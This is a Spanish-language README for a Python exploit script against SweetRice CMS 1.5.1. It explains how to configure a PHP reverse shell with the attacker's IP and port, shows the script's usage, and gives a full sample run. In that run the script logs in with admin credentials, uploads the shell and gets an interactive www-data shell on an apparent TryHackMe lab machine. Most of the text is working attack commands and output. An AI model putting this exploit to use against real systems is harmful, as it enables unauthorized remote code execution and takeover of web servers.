# SweetRice-CMS-exploit

Explotación del CMS SweetRice 1.5.1 que permite de format autenticada la subida de un archivo php que otorga una reverse shell.
El archivo utilizado se puede descargar desde este repositorio o desde [PentestMonkey](https://pentestmonkey.net/tools/web-shells/php-reverse-shell)

## Ejecución:

Editar el archivo `php-reverse-shell.php5` y modificar las siguientes variables por las de nuestra máquina:
- ip
- port

Ejecutar el script `sweetrice.py` de acuerdo con el panel de ayuda:

```bash
❯ python3 sweetrice.py
usage: sweetrice.py [-h] --url URL --user USER --passwd PASSWD [--filename FILENAME] --lhost LHOST [--lport LPORT]
sweetrice.py: error: the following arguments are required: --url, --user, --passwd, --lhost
❯ python3 sweetrice.py -h
usage: sweetrice.py [-h] --url URL --user USER --passwd PASSWD [--filename FILENAME] --lhost LHOST [--lport LPORT]

Authenticated Remote Code Execution - SweetRice 1.5.1

optional arguments:
  -h, --help           show this help message and exit
  --url URL            URL SweetRice
  --user USER          Username Panel Login SweetRice
  --passwd PASSWD      Password Panel Login SweetRice
  --filename FILENAME  Reverse Shell Filename (default: php-reverse-shell.php5)
  --lhost LHOST        Local host (attacker IP address)
  --lport LPORT        Local port (attacker port)
```

Ejecutando el script con los datos correspondiente y requeridos:

```bash
❯ python3 sweetrice.py --url http://10.10.170.246/content --user manager --passwd Password123 --lhost 10.9.85.95
[+] Login CMS SweetRice: Login successful
[+] Shell: Established connection!
[+] Trying to bind to :: on port 443: Done
[+] Waiting for connections on :::443: Got connection from ::ffff:10.10.170.246 on port 59212
[+] Reading file: File php-reverse-shell.php5 exists!
[+] File: File uploaded
[+] Reverse Shell: Correct reverse shell
[*] Switching to interactive mode
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 04:57:01 up  1:57,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ $ whoami
www-data
$ $  
```
